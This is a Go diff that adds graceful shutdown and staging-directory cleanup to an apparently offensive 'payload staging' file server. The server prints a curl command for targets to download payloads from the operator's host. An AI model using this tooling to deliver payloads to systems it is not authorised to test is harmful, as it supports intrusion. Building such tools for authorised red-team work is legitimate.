@@ -8,11 +8,22 @@ import (
 	"log"
 	"net/http"
 	"os"
+	"os/signal"
 	"path/filepath"
+	"syscall"
 )
 
 // Function for staging the payload directory
 func StagePayloadDirectory(port string, stagingDir string, sourceDir string)  {
+	// Function to close and delete the staging dir
+	defer func() {
+		fmt.Printf("\n[*] Cleaning up: Removing staging directory: %s\n", stagingDir)
+		if err := os.RemoveAll(stagingDir); err != nil {
+			fmt.Printf("[-] Error cleaning up directory: %v\n", err)
+		}
+	}()
+
+	
 	// Creates the staging diredctory if it doesnt exist
 	if _, err := os.Stat(stagingDir); os.IsNotExist(err) {
 		// Stores the errors from creating the directory
@@ -49,6 +60,10 @@ func StagePayloadDirectory(port string, stagingDir string, sourceDir string)  {
 		}
 	}
 
+	// Sets up the os signal channel to intercept termination
+	stop := make(chan os.Signal, 1)
+	signal.Notify(stop, os.Interrupt, syscall.SIGTERM)
+
 	// Creates the file server handler
 	fileServer := http.FileServer(http.Dir(stagingDir))
 
@@ -57,11 +72,18 @@ func StagePayloadDirectory(port string, stagingDir string, sourceDir string)  {
 	fmt.Printf("[*] Serving files from: %s\n", stagingDir)
 	fmt.Printf("[*] Target download example: curl http://%s:%s/%s/file\n", networking.GetOutboundIP(), port, stagingDir)
 
-	// Starts the server
-	err := http.ListenAndServe(":"+port, fileServer)
+	// Start the server inside a background goroutine so it doesn't block the signals
+	go func() {
+		err := http.ListenAndServe(":"+port, fileServer)
+		// We ignore http.ErrServerClosed because it represents a planned shutdown
+		if err != nil && err != http.ErrServerClosed {
+			log.Printf("Server failed: %v\n", err)
+			// Trigger stop channel if server crashes on its own
+			stop <- syscall.SIGTERM 
+		}
+	}()
 
-	// Checks if there is an error
-	if err != nil {
-		log.Fatal("Server failed:", err)
-	}
+	// Block here until the user presses Ctrl+C or a termination signal is received
+	<-stop
+	fmt.Println("[*] Stopping staging server...")
 }
